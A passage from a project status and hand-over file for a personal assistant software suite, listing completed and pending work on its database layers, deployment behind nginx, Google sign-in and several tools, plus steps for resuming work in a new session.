   - Left for its own change: axe's `label-content-name-mismatch` on the sidebar's `Jump to` button.

1. ~~**Postgres (layer 1 of the database plan).**~~ Built 2026-10-28, committed (`78fb441`) and the real import run 2026-10-29 (see "Built and verified").
   **The older host copies are deleted** (2026-10-30, the user's call): `assistant/memory.json` after all 9 of its
   facts were found identical in the database, and `assistant/audit.jsonl`, knowing 13 of its 628 rows
   (2026-10-19: an audiobook analysis and render, the rest mail syncs) were in no other place. (The two logins found dead
   on 2026-10-29, AWS and mail-compose, were renewed by the user the same day; `./auth --check` says all good.)
   The database password is the default (`suite`; no published port), because `POSTGRES_PASSWORD` is not set in `.env`.
2. ~~**Redis (layer 2).**~~ **Deferred to layer 3, 2026-10-29** (see "Layer 2: Redis"): the queries it would cache
   cost 1 to 10 ms and are polled every 30 s. Multi-user (layer 3) is pinned behind the deployment and the Google
   sign-in (item 4 below), so nothing here is next until the user says so.
3. When spellings arrive: lexicon → regenerate notes + minutes for `20260812_102457` → rebuild both
   Docs → trash the superseded ones (ask first).
4. **Pinned (2026-10-14, the user's call; not started).** Deploy to the instance: nginx on the host
   (containers stay on 127.0.0.1) with the page on one port and the API on another, as the Tailscale
   setup did; proxy buffering off and no body limit for the event stream and uploads; no access log
   for `/api/events` (its `?token=` would be written to it); basic auth on the page's origin only,
   because a CORS preflight carries no credentials, so the API stays behind its token; a self-signed
   certificate. Then the Google sign-in (`assistant/CLAUDE.md`, "Authentication"), whose first step is
   to see whether Google accepts a redirect URI there. Through an SSM tunnel the page is on
   `localhost`, which Google does accept.
5. Give `assistant-cli` the document tools too, or say in its README that drafting is web-only.
6. docu-ai: continue numbering across a split list (reuse the list id), and indent notes' quotes
   by border inset — both are docu-ai changes, so confirm with the user first (they asked once
   that a minutes problem not be "fixed" in docu-ai when docu-ai wasn't the cause).
7. meet-ai: speaker enrollment (its `plan.md`, M3b).
8. audiobook: ~~a way to delete finished audio and uploaded books~~ (built 2026-10-30); list `~/Documents/books/` as a library;
   let chat teach corrections from what the user says it misread (the tool already has the operation).
9. Close the gaps from 2026-10-24 ("Gaps found on 2026-10-24" above), in step order, once decisions
   9–10 under "Waiting on the user" are answered. Decision 8 (web-ai) is answered: yes, driven by
   the job application workflow (see above), and **web-ai is built (2026-10-28)**. Still open in that workflow:
   ~~the descriptions that wire the steps together~~ (built 2026-10-30, with files by path),
   and ~~the end-to-end run on a real application, through the model~~ (done 2026-10-30). Decisions 11 and 12 are about web-ai. The user asked for the plan on 2026-10-24.

## Picking this up in a new session

1. Read `CLAUDE.md` here, then the `CLAUDE.md` of whatever tool you will touch.
2. `./test` — everything must pass with no credentials.
3. `./start` (which runs `./start-docker up`), open http://127.0.0.1:8751/, and look at
   **Buttons → Settings**: model login, network, and each tool's last call. An expired login is the
   usual first failure: `./auth --check` says which, and the user renews it with `./auth`.
4. Check "Waiting on the user" above before starting anything it lists.
